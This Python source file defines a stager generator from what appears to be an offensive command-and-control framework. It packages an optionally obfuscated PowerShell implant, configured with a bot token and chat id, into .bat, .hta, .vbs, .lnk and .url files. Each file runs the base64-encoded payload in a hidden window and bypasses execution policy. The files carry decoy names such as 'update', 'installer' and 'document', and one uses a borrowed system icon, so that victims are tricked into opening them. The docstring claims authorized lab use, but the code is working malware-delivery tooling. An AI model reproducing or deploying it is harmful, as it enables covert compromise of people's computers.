"""StagerGenerator — produces delivery artifacts in multiple formats."""
from __future__ import annotations
import base64
import os
from pathlib import Path


class StagerGenerator:
    """Generate stager payloads in various formats for authorized lab delivery."""

    FORMATS = ("ps1", "bat", "hta", "vbs", "lnk_cmd", "url")

    def generate(
        self,
        fmt: str,
        bot_token: str,
        chat_id: str,
        agent_id: str,
        sleep: int = 10,
        jitter: int = 20,
        obfuscate_level: int = 0,
        out_dir: str | Path = "build",
        filename: str = "",
    ) -> tuple[str, bytes]:
        """
        Build a stager artifact.

        Returns (filename, content_bytes).
        """
        from fitnah.delivery.stager import ps1_stager as _ps1

        ps1_src = _ps1.render(
            bot_token=bot_token,
            chat_id=chat_id,
            agent_id=agent_id,
            sleep=sleep,
            jitter=jitter,
        )

        if obfuscate_level > 0:
            from fitnah.delivery.obfuscation.ps_obfuscator import PSObfuscator
            ps1_src = PSObfuscator().obfuscate(ps1_src, level=obfuscate_level)

        fmt = fmt.lower()
        if fmt == "ps1":
            return self._as_ps1(ps1_src, agent_id, filename)
        elif fmt == "bat":
            return self._as_bat(ps1_src, agent_id, filename)
        elif fmt == "hta":
            return self._as_hta(ps1_src, agent_id, filename)
        elif fmt == "vbs":
            return self._as_vbs(ps1_src, agent_id, filename)
        elif fmt == "lnk_cmd":
            return self._as_lnk_cmd(ps1_src, agent_id, filename)
        elif fmt == "url":
            return self._as_url(ps1_src, agent_id, filename)
        else:
            raise ValueError(f"Unknown stager format: {fmt!r}")

    # ── format renderers ──────────────────────────────────────────────────

    def _as_ps1(self, src: str, agent_id: str, name: str) -> tuple[str, bytes]:
        fn = name or f"stager_{agent_id}.ps1"
        return fn, src.encode("utf-8")

    def _as_bat(self, ps1_src: str, agent_id: str, name: str) -> tuple[str, bytes]:
        enc = base64.b64encode(ps1_src.encode("utf-16-le")).decode("ascii")
        bat = (
            "@echo off\r\n"
            "powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass "
            f"-EncodedCommand {enc}\r\n"
        )
        fn = name or f"setup_{agent_id}.bat"
        return fn, bat.encode("ascii")

    def _as_hta(self, ps1_src: str, agent_id: str, name: str) -> tuple[str, bytes]:
        enc = base64.b64encode(ps1_src.encode("utf-16-le")).decode("ascii")
        cmd = f"powershell -nop -w hidden -EncodedCommand {enc}"
        hta = f"""<html><head>
<HTA:APPLICATION ID="App" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no" BORDER="none"/>
<script language="VBScript">
Sub Window_onLoad
  Dim oShell : Set oShell = CreateObject("WScript.Shell")
  oShell.Run "{cmd}", 0, False
  self.close
End Sub
</script>
</head><body></body></html>"""
        fn = name or f"update_{agent_id}.hta"
        return fn, hta.encode("utf-8")

    def _as_vbs(self, ps1_src: str, agent_id: str, name: str) -> tuple[str, bytes]:
        enc = base64.b64encode(ps1_src.encode("utf-16-le")).decode("ascii")
        cmd = f"powershell -nop -w hidden -EncodedCommand {enc}"
        vbs = (
            f'Set oShell = CreateObject("WScript.Shell")\r\n'
            f'oShell.Run "{cmd}", 0, False\r\n'
        )
        fn = name or f"installer_{agent_id}.vbs"
        return fn, vbs.encode("ascii")

    def _as_lnk_cmd(self, ps1_src: str, agent_id: str, name: str) -> tuple[str, bytes]:
        """Return a PS snippet that creates a .lnk shortcut (operator runs this locally)."""
        enc = base64.b64encode(ps1_src.encode("utf-16-le")).decode("ascii")
        cmd = f"powershell -nop -w hidden -EncodedCommand {enc}"
        fn  = name or f"shortcut_{agent_id}.lnk"
        ps_create_lnk = (
            f"$sh = New-Object -ComObject WScript.Shell;"
            f"$lnk = $sh.CreateShortcut([IO.Path]::Combine($env:TEMP, '{fn}'));"
            "$lnk.TargetPath = 'cmd.exe';"
            f"$lnk.Arguments = '/c {cmd}';"
            "$lnk.WindowStyle = 7;"
            "$lnk.IconLocation = '%SystemRoot%\\system32\\shell32.dll,70';"
            "$lnk.Save();"
            f"Write-Output \"LNK created: $env:TEMP\\{fn}\""
        )
        return fn + ".ps1", ps_create_lnk.encode("utf-8")

    def _as_url(self, ps1_src: str, agent_id: str, name: str) -> tuple[str, bytes]:
        """Create a .url internet shortcut that runs the stager via mshta."""
        enc = base64.b64encode(ps1_src.encode("utf-16-le")).decode("ascii")
        url_content = (
            "[InternetShortcut]\r\n"
            f"URL=javascript:new ActiveXObject('WScript.Shell').Run('powershell -nop -w hidden -EncodedCommand {enc}',0,false)\r\n"
            "IconFile=%SystemRoot%\\system32\\SHELL32.dll\r\nIconIndex=13\r\n"
        )
        fn = name or f"document_{agent_id}.url"
        return fn, url_content.encode("utf-8")
